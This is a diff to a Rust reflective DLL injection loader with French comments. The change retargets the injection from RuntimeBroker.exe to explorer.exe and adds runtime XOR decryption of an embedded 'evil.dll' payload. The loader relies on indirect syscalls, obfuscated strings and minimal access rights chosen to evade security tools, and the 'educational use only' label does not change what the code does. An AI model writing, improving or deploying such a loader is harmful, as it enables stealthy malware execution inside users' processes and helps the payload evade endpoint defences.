@@ -1,28 +1,29 @@
 /*
     ============================================================
-    🦀 REFLECTIVE DLL LOADER v5 - ReflectiveLdr Edition
+    REFLECTIVE DLL LOADER v5 - ReflectiveLdr Edition
     ============================================================
 
-    Ce loader démontre les concepts suivants:
+    Ce loader demontre les concepts suivants:
     1. Reflective DLL Injection (ReflectiveLdr)
     2. PE Parsing pour trouver l'export ReflectiveLoader
-    3. Indirect Syscalls (call stack légitime)
-    4. Process Injection dans RuntimeBroker.exe
+    3. Indirect Syscalls (call stack legitime)
+    4. Process Injection dans explorer.exe
     5. Droits minimum (0x002A, pas PROCESS_ALL_ACCESS!)
 
     Flow v5:
-    1. Lire la DLL reflective (include_bytes!)
-    2. Parser le PE pour trouver l'offset de ReflectiveLoader
-    3. Énumération des processes pour trouver RuntimeBroker.exe
-    4. NtOpenProcess avec droits minimum
-    5. NtAllocateVirtualMemory (remote, RW)
-    6. NtWriteVirtualMemory (copie la DLL entière)
-    7. NtProtectVirtualMemory (RW→RX)
-    8. NtCreateThreadEx (remote thread → ReflectiveLoader)
-    9. ReflectiveLoader mappe la DLL → DllMain → Payload!
-    10. NtClose pour cleanup
+    1. Lire la DLL reflective chiffree (include_bytes!)
+    2. Dechiffrer la DLL au runtime (XOR)
+    3. Parser le PE pour trouver l'offset de ReflectiveLoader
+    4. Enumeration des processes pour trouver explorer.exe
+    5. NtOpenProcess avec droits minimum
+    6. NtAllocateVirtualMemory (remote, RW)
+    7. NtWriteVirtualMemory (copie la DLL entiere)
+    8. NtProtectVirtualMemory (RW->RX)
+    9. NtCreateThreadEx (remote thread -> ReflectiveLoader)
+    10. ReflectiveLoader mappe la DLL -> DllMain -> Payload!
+    11. NtClose pour cleanup
 
-    ⚠️  USAGE ÉDUCATIF UNIQUEMENT
+    USAGE EDUCATIF UNIQUEMENT
 
     Auteur: Educational Purpose
 */
@@ -461,7 +462,7 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
 // FONCTION: find_process_pid
 // ============================================================
 // Énumère tous les processus et retourne le PID du premier
-// processus correspondant au nom donné (ex: "RuntimeBroker.exe")
+// processus correspondant au nom donné (ex: "explorer.exe")
 //
 // Utilise NtQuerySystemInformation avec SystemProcessInformation
 // pour obtenir la liste de tous les processus
@@ -545,7 +546,7 @@ fn find_process_pid(target_name: &str) -> Option<u32> {
 // Fonction principale qui injecte une DLL reflective dans un processus cible
 //
 // Paramètres:
-//   - target_pid: PID du processus cible (ex: RuntimeBroker.exe)
+//   - target_pid: PID du processus cible (ex: explorer.exe)
 //   - dll_bytes: Bytes bruts de la DLL (evil.dll)
 //   - loader_offset: File offset de ReflectiveLoader dans la DLL
 //
@@ -780,7 +781,7 @@ fn main() {
     ║  Techniques:                                              ║
     ║  ✓ Reflective DLL Injection (ReflectiveLdr)               ║
     ║  ✓ PE Parsing (find ReflectiveLoader export)              ║
-    ║  ✓ Process injection into existing RuntimeBroker.exe      ║
+    ║  ✓ Process injection into existing explorer.exe            ║
     ║  ✓ Indirect syscalls                                      ║
     ║  ✓ Minimum rights (0x002A)                                ║
     ║  ✓ RW → RX memory protection                              ║
@@ -817,20 +818,19 @@ fn main() {
     };
 
     // =========================================================
-    // ÉTAPE 2: Trouver RuntimeBroker.exe
+    // ÉTAPE 2: Trouver explorer.exe
     // =========================================================
-    debug_println!("\n[*] Searching for RuntimeBroker.exe...");
+    debug_println!("\n[*] Searching for explorer.exe...");
 
-    let pid = match find_process_pid(&obf_str!("RuntimeBroker.exe")) {
+    let pid = match find_process_pid(&obf_str!("explorer.exe")) {
         Some(pid) => pid,
         None => {
-            debug_eprintln!("[✗] RuntimeBroker.exe not found!");
-            debug_eprintln!("[*] Tip: Open Windows Settings to spawn RuntimeBroker.exe");
+            debug_eprintln!("[✗] explorer.exe not found!");
             std::process::exit(1);
         }
     };
 
-    debug_println!("[+] Found RuntimeBroker.exe with PID: {}", pid);
+    debug_println!("[+] Found explorer.exe with PID: {}", pid);
 
     // =========================================================
     // ÉTAPE 3: Injecter la DLL reflective
